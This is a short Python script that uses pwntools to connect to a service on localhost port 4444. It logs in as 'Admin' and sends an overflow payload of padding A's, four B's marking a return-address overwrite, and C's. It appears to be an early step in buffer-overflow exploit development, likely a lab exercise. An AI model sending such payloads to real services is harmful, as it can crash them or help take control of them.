import pwn

user = "Admin"
conn = pwn.remote("127.0.0.1", 4444)

payload = "A" * 1028 + "B" * 4 + "C" * 5000

conn.recvuntil(":")
conn.sendline(user)
conn.recvuntil(":")
conn.sendline(payload)
